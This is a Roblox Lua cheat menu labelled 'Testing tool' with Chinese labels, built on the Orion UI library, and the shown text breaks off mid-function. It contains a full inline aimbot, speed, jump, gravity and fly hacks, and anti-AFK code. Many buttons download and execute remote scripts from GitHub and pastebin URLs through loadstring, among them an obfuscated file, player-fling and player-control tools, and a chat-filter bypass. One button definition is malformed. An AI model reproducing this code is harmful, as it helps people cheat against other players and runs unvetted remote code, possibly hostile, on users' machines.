local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end
	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	FpsLabel.Text = ("北京时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S"))
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)
local Window = OrionLib:MakeWindow({Name = "Testing tool", HidePremium = false, SaveConfig = true,IntroText = "Testing tool", ConfigFolder = "Testing tool"})

game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "Testing tool"; Text ="Testing tool"; Duration = 4; })

local about = Window:MakeTab({
    Name = "用户设置",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false

})

about:AddParagraph("娱乐内存仅支持部分地图")
about:AddParagraph("仅开发者使用 测试工具")
about:AddParagraph("开发者：慢慢习惯 拔叔（冒泡）")
about:AddParagraph("用户协议书：2999.12.30")

OrionLib:MakeNotification({
	Name = "Testing tool",
	Content = "验证成功",
	Image = "rbxassetid://4483345998",
	Time = 2

})

local Tab = Window:MakeTab({

    Name = "绘制功能",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

local Section = Tab:AddSection({

	Name = "测试工具"

})

Tab:AddSlider({

	Name = "速度",

	Min = 16,

	Max = 200,

	Default = 16,

	Color = Color3.fromRGB(255,255,255),

	Increment = 1,

	ValueName = "数值",

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end    

})

Tab:AddSlider({

	Name = "跳跃高度",

	Min = 50,

	Max = 200,

	Default = 50,

	Color = Color3.fromRGB(255,255,255),

	Increment = 1,

	ValueName = "数值",

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value

	end    

})

Tab:AddTextbox({

	Name = "跳跃高度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value

	end

})

Tab:AddTextbox({

	Name = "移动速度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end

})

Tab:AddTextbox({

	Name = "重力设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Workspace.Gravity = Value

	end

})

Tab:AddToggle({

	Name = "夜视",

	Default = false,

	Callback = function(Value)

		if Value then

		    game.Lighting.Ambient = Color3.new(1, 1, 1)

		else

		    game.Lighting.Ambient = Color3.new(0, 0, 0)

		end

	end

})

Tab:AddButton({

	Name = "绘制",

	Callback = function()

     loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/UNIVERSALESPLTX/main/README.md'),true))()

  	end    

})

Tab:AddButton({

	Name = "ESP",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/15/refs/heads/main/ESP.txt"))()

  	end    

})

Tab:AddButton({

	Name = "自瞄",

	Callback = function()

     local fov = 100 local smoothness = 10 local crosshairDistance = 5 local RunService = game:GetService("RunService") local UserInputService = game:GetService("UserInputService") local Players = game:GetService("Players") local Cam = game.Workspace.CurrentCamera local FOVring = Drawing.new("Circle") FOVring.Visible = true FOVring.Thickness = 2 FOVring.Color = Color3.fromRGB(0, 255, 0) FOVring.Filled = false FOVring.Radius = fov FOVring.Position = Cam.ViewportSize / 2 local Player = Players.LocalPlayer local PlayerGui = Player:WaitForChild("PlayerGui") local ScreenGui = Instance.new("ScreenGui") ScreenGui.Name = "FovAdjustGui" ScreenGui.Parent = PlayerGui local Frame = Instance.new("Frame") Frame.Name = "MainFrame" Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) Frame.BorderColor3 = Color3.fromRGB(128, 0, 128) Frame.BorderSizePixel = 2 Frame.Position = UDim2.new(0.3, 0, 0.3, 0) Frame.Size = UDim2.new(0.4, 0, 0.4, 0) Frame.Active = true Frame.Draggable = true Frame.Parent = ScreenGui local MinimizeButton = Instance.new("TextButton") MinimizeButton.Name = "MinimizeButton" MinimizeButton.Text = "-" MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255) MinimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50) MinimizeButton.Position = UDim2.new(0.9, 0, 0, 0) MinimizeButton.Size = UDim2.new(0.1, 0, 0.1, 0) MinimizeButton.Parent = Frame local isMinimized = false MinimizeButton.MouseButton1Click:Connect(function() isMinimized = not isMinimized if isMinimized then Frame:TweenSize(UDim2.new(0.1, 0, 0.1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true) MinimizeButton.Text = "+" else Frame:TweenSize(UDim2.new(0.4, 0, 0.4, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true) MinimizeButton.Text = "-" end end) local FovLabel = Instance.new("TextLabel") FovLabel.Name = "FovLabel" FovLabel.Text = "自瞄范围" FovLabel.TextColor3 = Color3.fromRGB(255, 255, 255) FovLabel.BackgroundTransparency = 1 FovLabel.Position = UDim2.new(0.1, 0, 0.1, 0) FovLabel.Size = UDim2.new(0.8, 0, 0.2, 0) FovLabel.Parent = Frame local FovSlider = Instance.new("TextBox") FovSlider.Name = "FovSlider" FovSlider.Text = tostring(fov) FovSlider.TextColor3 = Color3.fromRGB(255, 255, 255) FovSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) FovSlider.Position = UDim2.new(0.1, 0, 0.3, 0) FovSlider.Size = UDim2.new(0.8, 0, 0.2, 0) FovSlider.Parent = Frame local SmoothnessLabel = Instance.new("TextLabel") SmoothnessLabel.Name = "SmoothnessLabel" SmoothnessLabel.Text = "自瞄平滑度" SmoothnessLabel.TextColor3 = Color3.fromRGB(255, 255, 255) SmoothnessLabel.BackgroundTransparency = 1 SmoothnessLabel.Position = UDim2.new(0.1, 0, 0.5, 0) SmoothnessLabel.Size = UDim2.new(0.8, 0, 0.2, 0) SmoothnessLabel.Parent = Frame local SmoothnessSlider = Instance.new("TextBox") SmoothnessSlider.Name = "SmoothnessSlider" SmoothnessSlider.Text = tostring(smoothness) SmoothnessSlider.TextColor3 = Color3.fromRGB(255, 255, 255) SmoothnessSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) SmoothnessSlider.Position = UDim2.new(0.1, 0, 0.7, 0) SmoothnessSlider.Size = UDim2.new(0.8, 0, 0.2, 0) SmoothnessSlider.Parent = Frame local CrosshairDistanceLabel = Instance.new("TextLabel") CrosshairDistanceLabel.Name = "CrosshairDistanceLabel" CrosshairDistanceLabel.Text = "自瞄预判距离" CrosshairDistanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255) CrosshairDistanceLabel.BackgroundTransparency = 1 CrosshairDistanceLabel.Position = UDim2.new(0.1, 0, 0.9, 0) CrosshairDistanceLabel.Size = UDim2.new(0.8, 0, 0.2, 0) CrosshairDistanceLabel.Parent = Frame local CrosshairDistanceSlider = Instance.new("TextBox") CrosshairDistanceSlider.Name = "CrosshairDistanceSlider" CrosshairDistanceSlider.Text = tostring(crosshairDistance) CrosshairDistanceSlider.TextColor3 = Color3.fromRGB(255, 255, 255) CrosshairDistanceSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) CrosshairDistanceSlider.Position = UDim2.new(0.1, 0, 1.1, 0) CrosshairDistanceSlider.Size = UDim2.new(0.8, 0, 0.2, 0) CrosshairDistanceSlider.Parent = Frame local targetCFrame = Cam.CFrame local function updateDrawings() local camViewportSize = Cam.ViewportSize FOVring.Position = camViewportSize / 2 FOVring.Radius = fov end local function onKeyDown(input) if input.KeyCode == Enum.KeyCode.Delete then RunService:UnbindFromRenderStep("FOVUpdate") FOVring:Remove() end end UserInputService.InputBegan:Connect(onKeyDown) local function getClosestPlayerInFOV(trg_part) local nearest = nil local last = math.huge local playerMousePos = Cam.ViewportSize / 2 for _, player in ipairs(Players:GetPlayers()) do if player ~= Players.LocalPlayer then local part = player.Character and player.Character:FindFirstChild(trg_part) if part then local ePos, isVisible = Cam:WorldToViewportPoint(part.Position) local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude if distance < last and isVisible and distance < fov then last = distance nearest = player end end end end return nearest end RunService.RenderStepped:Connect(function() updateDrawings() local closest = getClosestPlayerInFOV("Head") if closest and closest.Character:FindFirstChild("Head") then local targetCharacter = closest.Character local targetHead = targetCharacter.Head local targetRootPart = targetCharacter:FindFirstChild("HumanoidRootPart") local isMoving = targetRootPart.Velocity.Magnitude > 0.1 local targetPosition if isMoving then targetPosition = targetHead.Position + (targetHead.CFrame.LookVector * crosshairDistance) else targetPosition = targetHead.Position end targetCFrame = CFrame.new(Cam.CFrame.Position, targetPosition) else targetCFrame = Cam.CFrame end Cam.CFrame = Cam.CFrame:Lerp(targetCFrame, 1 / smoothness) end) FovSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newFov = tonumber(FovSlider.Text) if newFov then fov = newFov else FovSlider.Text = tostring(fov) end end end) SmoothnessSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newSmoothness = tonumber(SmoothnessSlider.Text) if newSmoothness then smoothness = newSmoothness else SmoothnessSlider.Text = tostring(smoothness) end end end) CrosshairDistanceSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newCrosshairDistance = tonumber(CrosshairDistanceSlider.Text) if newCrosshairDistance then crosshairDistance = newCrosshairDistance else CrosshairDistanceSlider.Text = tostring(crosshairDistance) end end end)

  	end    

})

Tab:AddButton({

	Name = "正常自瞄",

	Callback = function()

     local fov = 75
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local Cam = game.Workspace.CurrentCamera
 
local FOVring = Drawing.new("Circle")
FOVring.Visible = true
FOVring.Thickness = 2
FOVring.Color = Color3.fromRGB(0, 0, 0) -- black color
FOVring.Filled = false
FOVring.Radius = fov
FOVring.Position = Cam.ViewportSize / 2
 
local function updateDrawings()
    local camViewportSize = Cam.ViewportSize
    FOVring.Position = camViewportSize / 2
end
 
local function onKeyDown(input)
    if input.KeyCode == Enum.KeyCode.Delete then
        RunService:UnbindFromRenderStep("FOVUpdate")
        FOVring:Remove()
    end
end
 
UserInputService.InputBegan:Connect(onKeyDown)
 
local function lookAt(target)
    local lookVector = (target - Cam.CFrame.Position).unit
    local newCFrame = CFrame.new(Cam.CFrame.Position, Cam.CFrame.Position + lookVector)
    Cam.CFrame = newCFrame
end
 
local function getClosestPlayerInFOV(trg_part)
    local nearest = nil
    local last = math.huge
    local playerMousePos = Cam.ViewportSize / 2
 
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            local part = player.Character and player.Character:FindFirstChild(trg_part)
            if part then
                local ePos, isVisible = Cam:WorldToViewportPoint(part.Position)
                local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude
 
                if distance < last and isVisible and distance < fov then
                    last = distance
                    nearest = player
                end
            end
        end
    end
 
    return nearest
end
 
RunService.RenderStepped:Connect(function()
    updateDrawings()
    local closest = getClosestPlayerInFOV("Head")
    if closest and closest.Character:FindFirstChild("Head") then
        lookAt(closest.Character.Head.Position)
    end
end)

  	end    

})

Tab:AddButton({

	Name = "阿尔子追",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/sgbs/main/%E4%B8%81%E4%B8%81%20%E6%B1%89%E5%8C%96%E8%87%AA%E7%9E%84.txt"))()

  	end    

})

Tab:AddButton({

	Name = "俄州子追",

	Callback = function()

     loadstring(game:HttpGet("https://gist.githubusercontent.com/ClasiniZukov/e7547e7b48fa90d10eb7f85bd3569147/raw/f95cd3561a3bb3ac6172a14eb74233625b52e757/gistfile1.txt"))()

  	end    

})

local Tab = Window:MakeTab({

    Name = "内存功能",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "提升流畅",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/FPS-X-GUI/main/FPS_X.lua"))()

  	end    

})

Tab:AddButton({

	Name = "高清光影 ",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()

  	end    

})

Tab:AddButton({

	Name = "车子飞天",

	Callback = function()

     local Speed = 30

	-- Gui to Lua
	-- Version: 3.2
	local HumanoidRP = game.Players.LocalPlayer.Character.HumanoidRootPart
	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local W = Instance.new("TextButton")
	local S = Instance.new("TextButton")
	local A = Instance.new("TextButton")
	local D = Instance.new("TextButton")
	local Fly = Instance.new("TextButton")
	local unfly = Instance.new("TextButton")
	local StopFly = Instance.new("TextButton")

	--Properties:

	ScreenGui.Parent = game.CoreGui
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	unfly.Name = "关闭飞行"
	unfly.Parent = ScreenGui
	unfly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	unfly.Position = UDim2.new(0.694387913, 0, 0.181818187, 0)
	unfly.Size = UDim2.new(0, 72, 0, 50)
	unfly.Font = Enum.Font.SourceSans
	unfly.Text = "关闭飞行"
	unfly.TextColor3 = Color3.fromRGB(170, 0, 255)
	unfly.TextScaled = true
	unfly.TextSize = 14.000
	unfly.TextWrapped = 
		unfly.MouseButton1Down:Connect(function()
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
	end)

	StopFly.Name = "暂停飞行"
	StopFly.Parent = ScreenGui
	StopFly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	StopFly.Position = UDim2.new(0.695689976, 0, 0.0213903747, 0)
	StopFly.Size = UDim2.new(0, 71, 0, 50)
	StopFly.Font = Enum.Font.SourceSans
	StopFly.Text = "暂停飞行"
	StopFly.TextColor3 = Color3.fromRGB(170, 0, 255)
	StopFly.TextScaled = true
	StopFly.TextSize = 14.000
	StopFly.TextWrapped = true
	StopFly.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = true
	end)

	Fly.Name = "飞行"
	Fly.Parent = ScreenGui
	Fly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Fly.Position = UDim2.new(0.588797748, 0, 0.0213903747, 0)
	Fly.Size = UDim2.new(0, 66, 0, 50)
	Fly.Font = Enum.Font.SourceSans
	Fly.Text = "飞行"
	Fly.TextColor3 = Color3.fromRGB(170, 0, 127)
	Fly.TextScaled = true
	Fly.TextSize = 14.000
	Fly.TextWrapped = true
	Fly.MouseButton1Down:Connect(function()
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	end)

	W.Name = "W"
	W.Parent = ScreenGui
	W.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	W.Position = UDim2.new(0.161668837, 0, 0.601604283, 0)
	W.Size = UDim2.new(0, 58, 0, 50)
	W.Font = Enum.Font.SourceSans
	W.Text = "↑"
	W.TextColor3 = Color3.fromRGB(226, 226, 526)
	W.TextScaled = true
	W.TextSize = 5.000
	W.TextWrapped = true
	W.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 50000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * Speed
	end)


	S.Name = "S"
	S.Parent = ScreenGui
	S.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	S.Position = UDim2.new(0.161668837, 0, 0.735294104, 0)
	S.Size = UDim2.new(0, 58, 0, 50)
	S.Font = Enum.Font.SourceSans
	S.Text = "↓"
	S.TextColor3 = Color3.fromRGB(255, 255, 255)
	S.TextScaled = true
	S.TextSize = 14.000
	S.TextWrapped = true
	S.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * -Speed
	end)

  	end    

})

Tab:AddButton({

	Name = "车子飞天（超快）",

	Callback = function()

     local Speed = 491

	-- Gui to Lua
	-- Version: 3.2
	local HumanoidRP = game.Players.LocalPlayer.Character.HumanoidRootPart
	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local W = Instance.new("TextButton")
	local S = Instance.new("TextButton")
	local A = Instance.new("TextButton")
	local D = Instance.new("TextButton")
	local Fly = Instance.new("TextButton")
	local unfly = Instance.new("TextButton")
	local StopFly = Instance.new("TextButton")

	--Properties:

	ScreenGui.Parent = game.CoreGui
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	unfly.Name = "unfly"
	unfly.Parent = ScreenGui
	unfly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	unfly.Position = UDim2.new(0.694387913, 0, 0.181818187, 0)
	unfly.Size = UDim2.new(0, 72, 0, 50)
	unfly.Font = Enum.Font.SourceSans
	unfly.Text = "取消飞"
	unfly.TextColor3 = Color3.fromRGB(170, 0, 255)
	unfly.TextScaled = true
	unfly.TextSize = 14.000
	unfly.TextWrapped = 
		unfly.MouseButton1Down:Connect(function()
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
	end)

	StopFly.Name = "Stop Fly"
	StopFly.Parent = ScreenGui
	StopFly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	StopFly.Position = UDim2.new(0.695689976, 0, 0.0213903747, 0)
	StopFly.Size = UDim2.new(0, 71, 0, 50)
	StopFly.Font = Enum.Font.SourceSans
	StopFly.Text = "定住"
	StopFly.TextColor3 = Color3.fromRGB(170, 0, 255)
	StopFly.TextScaled = true
	StopFly.TextSize = 14.000
	StopFly.TextWrapped = true
	StopFly.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = true
	end)

	Fly.Name = "Fly"
	Fly.Parent = ScreenGui
	Fly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Fly.Position = UDim2.new(0.588797748, 0, 0.0213903747, 0)
	Fly.Size = UDim2.new(0, 66, 0, 50)
	Fly.Font = Enum.Font.SourceSans
	Fly.Text = "飞"
	Fly.TextColor3 = Color3.fromRGB(170, 0, 127)
	Fly.TextScaled = true
	Fly.TextSize = 14.000
	Fly.TextWrapped = true
	Fly.MouseButton1Down:Connect(function()
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	end)

	W.Name = "W"
	W.Parent = ScreenGui
	W.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	W.Position = UDim2.new(0.161668837, 0, 0.601604283, 0)
	W.Size = UDim2.new(0, 58, 0, 50)
	W.Font = Enum.Font.SourceSans
	W.Text = "前"
	W.TextColor3 = Color3.fromRGB(226, 226, 226)
	W.TextScaled = true
	W.TextSize = 5.000
	W.TextWrapped = true
	W.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * Speed
	end)


	S.Name = "S"
	S.Parent = ScreenGui
	S.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	S.Position = UDim2.new(0.161668837, 0, 0.735294104, 0)
	S.Size = UDim2.new(0, 58, 0, 50)
	S.Font = Enum.Font.SourceSans
	S.Text = "后"
	S.TextColor3 = Color3.fromRGB(255, 255, 255)
	S.TextScaled = true
	S.TextSize = 14.000
	S.TextWrapped = true
	S.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * -Speed
	end)


  	end    

})

Tab:AddButton({

	Name = "防止掉线",

	Callback = function()

     	print("Anti Afk On")

		local vu = game:GetService("VirtualUser")

		game:GetService("Players").LocalPlayer.Idled:connect(function()

		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)

		   wait(1)

		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)

		end)

  	end    

})

Tab:AddButton({

	Name = "人物飞行",

	loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/12/refs/heads/main/B%E7%AB%99SASPOL%E7%8B%AC%E5%AE%B6%E9%A3%9E%E8%A1%8C%E8%84%9A%E6%9C%AC%EF%BC%88%E6%82%B2%EF%BC%89.txt"))()

  	end    

})

Tab:AddButton({

	Name = "阿尔飞行",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/5zJu3hfN"))()

  	end    

})

Tab:AddButton({

	Name = "Fc指令",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

  	end    

})

Tab:AddButton({

	Name = "进入提示",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()

  	end    

})

Tab:AddButton({

	Name = "立刻死亡",

	Callback = function()

     game.Players.LocalPlayer.Character.Humanoid.Health=0

  	end    

})

Tab:AddButton({

	Name = "骂人无违规",

	Callback = function()

     loadstring(game:GetObjects("rbxassetid://1262435912")[1].Source)()

  	end    

})

Tab:AddButton({

	Name = "玩家控制",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/13/refs/heads/main/%E7%8E%A9%E5%AE%B6%E6%8E%A7%E5%88%B6%20%E6%B1%89%E5%8C%96.txt"))()

  	end    

})

Tab:AddButton({

	Name = "人物踏空",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()

  	end    

})

Tab:AddButton({

	Name = "人物铁拳",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'))()

  	end    

})

Tab:AddButton({

	Name = "直升机旋转",

	Callback = function()

     if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
spawn(function()
local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://27432686"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
bruh:Play()
bruh:AdjustSpeed(0)
speaker.Character.Animate.Disabled = true
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=165113352"
hi.Volume = 2
hi.Looped = true
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()

local spinSpeed = 40
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)

end)
else
spawn(function()
local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://507776043"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
bruh:Play()
bruh:AdjustSpeed(0)
speaker.Character.Animate.Disabled = true
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=165113352"
hi.Volume = 2
hi.Looped = true
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()

local spinSpeed = 40
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)


end)    
end
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local u = game.Players.LocalPlayer
local urchar = u.Character

task.spawn(function()


qUp = Mouse.KeyUp:Connect(function(KEY)
if KEY == 'q' then
urchar.Humanoid.HipHeight = urchar.Humanoid.HipHeight - 3
end
end)
eUp = Mouse.KeyUp:Connect(function(KEY)
if KEY == 'e' then
urchar.Humanoid.HipHeight = urchar.Humanoid.HipHeight + 3
end
end)


end)

  	end    

})

Tab:AddButton({

	Name = "甩飞敌人",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()

  	end    

})

Tab:AddButton({

	Name = "灵魂出窍",

	Callback = function()

     for i, v in pairs(game.CoreGui:GetChildren()) do
    if v:FindFirstChild("UI") then
        v:Destroy()
    end
end
wait(1)

local UI = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local Toggle = Instance.new("ImageLabel")
local Button = Instance.new("TextButton")
local Circle = Instance.new("ImageLabel")
local InvisText = Instance.new("TextLabel")
local Credits = Instance.new("TextLabel")

--Properties:

UI.Name = "UI"
UI.Parent = game:WaitForChild("CoreGui")

Main.Name = "Main"
Main.Parent = UI
Main.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
Main.BackgroundTransparency = 1.000
Main.Position = UDim2.new(0.5, -75, 0.41232878, -37)
Main.Size = UDim2.new(0, 248, 0, 107)
Main.Image = "rbxassetid://3570695787"
Main.ImageColor3 = Color3.fromRGB(48, 48, 48)
Main.ScaleType = Enum.ScaleType.Slice
Main.SliceCenter = Rect.new(100, 100, 100, 100)
Main.SliceScale = 0.120

Toggle.Name = "Toggle"
Toggle.Parent = Main
Toggle.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle.BackgroundTransparency = 1.000
Toggle.Position = UDim2.new(0.5, -23, 0.565420568, -11)
Toggle.Size = UDim2.new(0, 46, 0, 22)
Toggle.Image = "rbxassetid://3570695787"
Toggle.ImageColor3 = Color3.fromRGB(200, 200, 200)
Toggle.ScaleType = Enum.ScaleType.Slice
Toggle.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle.SliceScale = 0.120

Button.Name = "Button"
Button.Parent = Toggle
Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button.BackgroundTransparency = 1.000
Button.Size = UDim2.new(1, 0, 1, 0)
Button.Font = Enum.Font.SourceSans
Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Button.TextSize = 14.000
Button.TextTransparency = 1.000

local toggled = false
local debounce = false

Button.MouseButton1Click:Connect(
    function()
        if debounce == false then
